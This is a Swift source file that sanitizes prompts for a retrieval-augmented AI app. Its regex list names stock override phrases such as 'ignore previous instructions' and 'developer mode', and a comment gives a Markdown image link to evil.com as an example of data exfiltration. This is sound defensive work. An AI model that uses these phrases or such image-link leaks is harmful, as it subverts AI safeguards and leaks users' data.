//
//  PromptSanitizer.swift
//  ZhiYu
//
//  Created by Antigravity on 2026/05/23.
//  Copyright © 2026 WangChong. All rights reserved.
//
//  系统层级：[L0.5] 系统集成层
//  核心职责：安全基础设施：Keychain 密钥管理、Secure Enclave 加密、HMAC 签名。
//
import Foundation

/// 智能 Prompt 防御净化层 (PromptSanitizer)
/// 专门针对 RAG 系统中的 Prompt 注入漏洞及 DLP 数据外泄提供物理屏障拦截。
final class PromptSanitizer: Sendable {
    /// 全局唯一的线程安全单例
    static let shared = PromptSanitizer()
    
    private init() {}
    
    // MARK: - 恶意注入检测正则列表
    
    /// 恶意 System Override 指令特征正则表达式库
    private let injectionPatterns: [String] = [
        #"(?i)ignore\s+(?:all\s+)?(?:previous|system|prior)\s+(?:instructions|directives|prompts|rules)"#,
        #"(?i)system\s+override"#,
        #"(?i)you\s+must\s+now\s+act\s+as"#,
        #"(?i)stop\s+following\s+instructions"#,
        #"(?i)bypass\s+the\s+safety"#,
        #"(?i)ignore\s+the\s+context\s+sandbox"#,
        #"(?i)forget\s+what\s+you\s+were\s+told"#,
        // 🛡️ 新增防御特征：拦截试图将模型诱导至所谓的“开发者模式”以解除安全限制的攻击
        #"(?i)developer\s+mode"#,
        // 🛡️ 新增防御特征：拦截任何尝试“绕过安全检查” (bypass security check) 语素的注入行为
        #"(?i)bypass\s+(?:the\s+)?(?:safety|security)(?:\s+check)?"#
    ]
    
    // MARK: - API 接口
    
    /// 对用户的 Prompt 进行安全性拦截与消毒
    /// - Parameter prompt: 原始 Prompt 输入
    /// - Returns: 净化后的安全 Prompt。如果包含高风险注入，则抹除敏感注入部分并发出安全警告。
    func sanitize(_ prompt: String) -> String {
        var sanitized = prompt
        
        // 依次用正则匹配并拦截/替换有毒指令，确保安全
        for pattern in injectionPatterns {
            if let regex = try? NSRegularExpression(pattern: pattern, options: []) {
                let range = NSRange(location: 0, length: sanitized.utf16.count)
                if regex.firstMatch(in: sanitized, options: [], range: range) != nil {
                    // 记录安全警报日志
                    Logger.shared.addLog(
                        action: .error,
                        target: "PromptSanitizer",
                        details: L10n.Security.promptInjectionLog(pattern),
                        module: "Security"
                    )
                    // 将恶意指令替换为无害的安全警告占位符
                    sanitized = regex.stringByReplacingMatches(
                        in: sanitized,
                        options: [],
                        range: range,
                        withTemplate: L10n.Security.promptInjectionPlaceholder
                    )
                }
            }
        }
        
        return sanitized
    }
    
    /// 过滤召回上下文中的动态数据泄露链接 (Data Loss Prevention)
    /// 主要拦截类似 `![leak](https://evil.com/leak?data=...)` 形式的恶意动态 Markdown 图像外链注入。
    /// - Parameter context: 召回的原始上下文内容
    /// - Returns: DLP 净化后的安全上下文
    func sanitizeContext(_ context: String) -> String {
        var sanitized = context
        
        // 匹配 Markdown 图片语法正则，特别关注包含网络主机的动态图片外链
        let markdownImagePattern = #"!\[([^\]]*)\]\((https?://[^)]+)\)"#
        
        if let regex = try? NSRegularExpression(pattern: markdownImagePattern, options: []) {
            let range = NSRange(location: 0, length: sanitized.utf16.count)
            
            // 将所有检测到的动态网络图像替换为本地安全卡片提示，物理隔绝 HTTP 外发请求
            sanitized = regex.stringByReplacingMatches(
                in: sanitized,
                options: [],
                range: range,
                withTemplate: L10n.Security.dlpImagePlaceholder
            )
        }
        
        return sanitized
    }
    
    /// 将召回的上下文安全包裹至 XML 金沙箱（Sandboxing）
    /// - Parameter content: 经过 DLP 净化后的 Context 文本
    /// - Returns: 包裹了严密指令的安全 XML 上下文
    func wrapInSandbox(_ content: String) -> String {
        let cleanContent = sanitizeContext(content)
        
        // 构造由 String Catalog 强类型多语言自适应支持的物理金沙箱
        return L10n.Security.sandboxInstructions(with: cleanContent)
    }
}